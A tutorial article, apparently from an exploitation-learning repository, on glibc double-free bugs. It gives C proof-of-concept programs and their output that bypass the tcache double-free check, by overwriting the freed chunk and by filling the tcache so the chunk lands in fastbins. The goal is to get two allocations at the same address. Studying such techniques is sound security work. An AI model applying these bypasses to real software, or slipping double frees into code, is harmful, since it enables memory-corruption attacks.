# Exploits
## Double Free (with bypass)
### Requirements : How fastbins works (https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explaination/The-Heap.md)
### Introduction
A double free happens when we, as the name indicates, free a chunk twice
In this article, we'll have a look at what happens when a double free occurs, and how we can use it for exploitation  
First, some mitigations were added against double frees, but we'll see how to to bypass them, especially to tricks  
### Requirements to understand this attack
It's essential to understand how fastbins works
So if you don't know, you can check my article on the subject : https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explaination/The-Heap.md
### Exploit
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
	char* a = malloc(0x10);
	char* b = malloc(0x10);
	char* c = malloc(0x10);

	printf("a@%p\n", a);
	printf("b@%p\n", b);
	printf("c@%p\n\n", c);
	
	free(a);
	free(b);
	free(a);
}
```
Here's a double free, as you can see we allocate `a`, `b` and `c`  
Then we free `a`, `b` and... `a` again !  
As you can see we freed `a` two times  
But what's the point, and also here's what happens when we execute the program :
```
a@0x4052a0
b@0x4052c0
c@0x4052e0

free(): double free detected in tcache 2
zsh: abort      ./prog
```
These are the mitigation i was talking about before, it detected the double free...
**OK now BREAKDOWN**  
In theory this is what happens when we do this  
As you may know, when we allocate like `ptr1`, `ptr2`, `ptr3` then when we free them in the same order, our fastbin looks like this :
```
Tcachebins[idx=0, size=0x10, count=3]
←  Chunk(addr=... (ptr3), size=0x10, flags=PREV_INUSE) 
←  Chunk(addr=... (ptr2), size=0x10, flags=PREV_INUSE) 
←  Chunk(addr=... (ptr1), size=0x10, flags=PREV_INUSE)
```
Remember, values are added and deleted as a stack  
Now here, in this program, after the frees it looks like this, after the first free :
```c
free(a);
```
So here's our fastbin :
```
Tcachebins[idx=0, size=0x10, count=3]
←  Chunk(addr=... (a), size=0x10, flags=PREV_INUSE)
```
Then :
```c
free(b)
```
Fastbin :
```
Tcachebins[idx=0, size=0x10, count=3]
←  Chunk(addr=... (b), size=0x10, flags=PREV_INUSE)
←  Chunk(addr=... (a), size=0x10, flags=PREV_INUSE)
```
And finally :
```c
free(a) // we free a again
```
So here's our fastbin at this point :
```
Tcachebins[idx=0, size=0x10, count=3]
←  Chunk(addr=... (a), size=0x10, flags=PREV_INUSE)
←  Chunk(addr=... (b), size=0x10, flags=PREV_INUSE)
←  Chunk(addr=... (a), size=0x10, flags=PREV_INUSE)
```
As you can see, we have in our tcache (which acts like a fastbin) `a` twice, if we had no error message and if we allocated new chunks, in theory :
```c
int main(void)
{
	char* a = malloc(0x10);
	char* b = malloc(0x10);
	char* c = malloc(0x10);

	printf("a@%p\n", a);
	printf("b@%p\n", b);
	printf("c@%p\n\n", c);

	free(a);
	free(b);
	free(a);

	// we should get "double free detected in tcache ..." message

	char* d = malloc(0x10);
	char* e = malloc(0x10);
	char* f = malloc(0x10);

	printf("d@%p\n", d);
	printf("e@%p\n", e);
	printf("f@%p\n", f);
}
```
Think about what will happen :
```
Tcachebins[idx=0, size=0x10, count=3]
←  Chunk(addr=... (a), size=0x10, flags=PREV_INUSE)
←  Chunk(addr=... (b), size=0x10, flags=PREV_INUSE)
←  Chunk(addr=... (a), size=0x10, flags=PREV_INUSE)
```
So when we malloc `d` :
```c
char* d = malloc(0x10); // => a
```
It will return the address of `a`, because it's at the top  
When we malloc `e` :
```c
char* e = malloc(0x10); // => b
```
It returns the address `b`  
So far nothing incredible... BUT can the spot the thing ?  
Now we will malloc `f` :
```
char* f = malloc(0x10); // => a AGAIN
```
So now for `f`, malloc will return `a` !!! It means that since `d` = `a` and `f` = `a`  
So now `d = f` !! So `d` and `f` have the same ADDRESSES !!  
It means that if we write any data to `d` memory, it will write it to `f` memory and also in the other way  
That's awesome !  
But... Remember...
Before even that our allocation take place we have this message and the program aborts :
```
free(): double free detected in tcache 2
zsh: abort      ./prog
```
So it detected our double free... it detected that there are two `a`s in our tcache...  
But this only applies to tcache, and since tcache has been introduced since glibc 2.26, only glibc version >= 2.26 will be affected by this mitigation  
So this code still works in a glibc version < 2.26, because it won't allocate on tcache but directly on fastbins, because tcache doesn't exist in these versions...  
That means that normal fastbins doesn't have this protection... Interesting, we'll see that later
### Mitigation bypass
To bypass this tcache protection, let's look at some tricks we can do **in any glibc version**
#### Trick n°1
The first trick to fix that is a simple thing, it's really simple and it consists on filling the a memory (so data not metadata part (address of a ptr))  
just after freeing it freeing it then free it again  
So since `a` memory is 0x10 = 16 bytes long (`malloc(0x10)`), we can just fill it with `a`s and it will still work :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
	char* a = malloc(0x10);
	char* b = malloc(0x10);
	char* c = malloc(0x10);

	printf("a@%p\n", a);
	printf("b@%p\n", b);
	printf("c@%p\n\n", c);

	free(a);
	free(b);

	memset(a, 'A', 0x10);

	free(a);

	// we should not get "double free detected in tcache ..." message anymore now

	char* d = malloc(0x10);
	char* e = malloc(0x10);
	char* f = malloc(0x10);

	printf("d@%p\n", d);
	printf("e@%p\n", e);
	printf("f@%p\n", f);
}
```
Now let's see what we get (it's in 64 bits) :
```
a@0x5555555592a0
b@0x5555555592c0
c@0x5555555592e0

d@0x5555555592a0
e@0x5555555592c0
f@0x5555555592a0
```

It worked this time ! `d` and`f` have the same address, it means that if we do like :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
	char* a = malloc(0x10);
	char* b = malloc(0x10);
	char* c = malloc(0x10);

	printf("a@%p\n", a);
	printf("b@%p\n", b);
	printf("c@%p\n\n", c);

	free(a);
	free(b);

	memset(a, 'A', 0x10); // Before we free it again, we fill `a` with 'A's (0x41)

	free(a);

	// we should not get "double free detected in tcache ..." message anymore now

	char* d = malloc(0x10);
	char* e = malloc(0x10);
	char* f = malloc(0x10);
	
	// d = f

	printf("d@%p\n", d);
	printf("e@%p\n", e);
	printf("f@%p\n", f);

	strcpy(d, "pwned");
	printf("d : %s\n", d);

	printf("f : %s\n", f);
}
```
Now we have :
```c
a@0x5555555592a0
b@0x5555555592c0
c@0x5555555592e0

d@0x5555555592a0
e@0x5555555592c0
f@0x5555555592a0
d : pwned
f : pwned

```
So when we write to `d` we write to `f` ! Isn't this awesome ?  
#### Trick n°2
Now there's another way ! So actually there is place for only 7 chunks in tcache after that, chunks go to fastbins where there's no protection  
So why don't we fill the tcache with unused chunks so then we use for our stuff only fastbins ? Sounds like a good plan !  
So let's do this :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define TCACHE_MAX_ENTRIES 7
/*
	Filling the tcache
*/

int main(void)
{
	// Allocation of our buffers
	char* a = malloc(0x10);
	char* b = malloc(0x10);
	char* c = malloc(0x10);

	
	// Fill the tcache
	// 1st : Allocations
	char* tcache_allocs[TCACHE_MAX_ENTRIES];
	for(unsigned long i = 0 ; i < TCACHE_MAX_ENTRIES ; i++)
	{
		tcache_allocs[i] = malloc(0x10);
	}

	// 2nd : Frees -> Tcache : Filling the tcache
	for(unsigned long i = 0 ; i < TCACHE_MAX_ENTRIES ; i++)
	{
		free(tcache_allocs[i]);
	}

	printf("a@%p\n", a);
	printf("b@%p\n", b);
	printf("c@%p\n\n", c);

	free(a);
	free(b);
	free(a);

	for(unsigned long i = 0 ; i < TCACHE_MAX_ENTRIES ; i++)
	{
		tcache_allocs[i] = malloc(0x10);
	}

	// we should not get "double free detected in tcache ..." message anymore now

	char* d = malloc(0x10);
	char* e = malloc(0x10);
	char* f = malloc(0x10);

	/*if(d == f)
	{
		printf("Pointers are the same\n");
	}*/

	printf("d@%p\n", d);
	printf("e@%p\n", e);
	printf("f@%p\n", f);

	strcpy(d, "pwned");
	printf("d : %s\n", d);

	printf("f : %s\n", f);
}
```
Here's how this works :  
- We allocate 3 pointers `a`, `b`, `c`
- We then allocate 7 pointers 
- We free all of ours 7 pointers, now tcache looks like this :
```
Tcachebins[idx=0, size=0x20, count=7]
←  Chunk(addr=0x4053c0, size=0x20, flags=PREV_INUSE) 
←  Chunk(addr=0x4053a0, size=0x20, flags=PREV_INUSE) 
←  Chunk(addr=0x405380, size=0x20, flags=PREV_INUSE) 
←  Chunk(addr=0x405360, size=0x20, flags=PREV_INUSE)
←  Chunk(addr=0x405340, size=0x20, flags=PREV_INUSE)
←  Chunk(addr=0x405320, size=0x20, flags=PREV_INUSE)
←  Chunk(addr=0x405300, size=0x20, flags=PREV_INUSE) 
```
Remember, at this point, fastbins are not used
- Afterwards, we free `a`, `b` and `a`, and these will be stored in fastbins because tcache is full :
```
Tcachebins[idx=0, size=0x20, count=7]
←  Chunk(addr=0x4053c0, size=0x20, flags=PREV_INUSE) 
←  Chunk(addr=0x4053a0, size=0x20, flags=PREV_INUSE) 
←  Chunk(addr=0x405380, size=0x20, flags=PREV_INUSE) 
←  Chunk(addr=0x405360, size=0x20, flags=PREV_INUSE)
←  Chunk(addr=0x405340, size=0x20, flags=PREV_INUSE)
←  Chunk(addr=0x405320, size=0x20, flags=PREV_INUSE)
←  Chunk(addr=0x405300, size=0x20, flags=PREV_INUSE) 
────────────────────────────────────────────────────────────────────────────────────────── Fastbins for arena at 0x7ffff7fa1b80 ──────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 
←  Chunk(addr=0x4052a0 (a), size=0x20, flags=PREV_INUSE)
←  Chunk(addr=0x4052c0 (b), size=0x20, flags=PREV_INUSE) 
←  Chunk(addr=0x4052a0 (a), size=0x20, flags=PREV_INUSE)  →  [loop detected]
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```
And now we get no error that makes program aborts, because we're not double freeing in tcache but in fastbins !   
Now before allocating new chunks   
We want to empty Tcache by allocating 7 new chunks otherwise it will allocate these new chunks in tcache and not in fastbins where we have our double pointer  
Remember it's this line of code :
```c
for(unsigned long i = 0 ; i < TCACHE_MAX_ENTRIES ; i++)
{
	tcache_allocs[i] = malloc(0x10);
}
```
So we just allocate these pointers again  
Now we're free to do anything in fastbins ! (got it ? Because we're free (double free) lmaoo)  
```c
char* d = malloc(0x10);
char* e = malloc(0x10);
char* f = malloc(0x10);

printf("d@%p\n", d);
printf("e@%p\n", e);
printf("f@%p\n", f);

strcpy(d, "pwned");
printf("d : %s\n", d); // d = f

printf("f : %s\n", f); // f = d
```
And we allocate 3 new chunks, they will as expected take the freed chunks addresses, as we said at the beginning, and malloc for `f` will return the same address as for `d`  So when we write "pwned\x00" to `d`, we write it to `f` at the same time  
And if we launch that...
```
a@0x4052a0
b@0x4052c0
c@0x4052e0

d@0x4052a0
e@0x4052c0
f@0x4052a0
d : pwned
f : pwned
```
That's perfect ! You can see they hold the same string ! Our exploit worked !  
